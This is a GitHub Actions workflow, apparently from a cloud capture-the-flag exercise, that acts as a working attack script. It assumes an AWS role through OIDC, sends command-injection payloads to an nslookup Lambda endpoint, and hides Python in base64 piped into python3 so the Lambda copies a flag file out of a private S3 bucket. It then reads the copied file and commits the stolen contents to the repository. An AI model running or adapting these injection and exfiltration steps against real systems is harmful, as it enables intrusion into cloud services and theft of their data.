name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Direct exfiltration via Lambda injection
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          DEST="s3://platform-bucket-009661764077-us-east-1/flag-direct.txt"

          echo "=== Attempt 1: aws s3 cp direct ==="
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt '"$DEST"' #"}'
          sleep 3
          aws s3 cp "$DEST" - 2>&1 && echo "" || echo "File not found via cicdRole"

          echo "=== Attempt 2: Python boto3 PutObject ==="
          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag-py.txt',Body=flag);print('Wrote',len(flag),'bytes')"
          B64=$(echo -n "$PY" | base64 -w0)
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}"
          sleep 3
          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag-py.txt" - 2>&1 && echo "" || echo "flag-py.txt not found"

          echo "=== Attempt 3: Base64 encode and write to public bucket ==="
          PY2="import boto3,base64;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();b64=base64.b64encode(flag).decode();s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag-b64.txt',Body=b64.encode())"
          B64_2=$(echo -n "$PY2" | base64 -w0)
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64_2 | base64 -d | python3 #\"}"
          sleep 3
          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag-b64.txt" - 2>&1 && echo "" || echo "flag-b64.txt not found"

      - name: Save and commit exfil results
        run: |
          echo "=== checking platform bucket ===" > exfil.txt
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ 2>&1 | grep -E "flag|exfil" >> exfil.txt || true

          # Try reading all potential flag files
          for key in flag-direct.txt flag-py.txt flag-b64.txt exfil-flag.txt; do
            echo "--- $key ---" >> exfil.txt
            aws s3 cp "s3://platform-bucket-009661764077-us-east-1/$key" - 2>&1 >> exfil.txt || true
          done

          cat exfil.txt

          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add exfil.txt
          git commit -m "direct exfil attempt" || echo "Nothing to commit"
          git push origin corgi
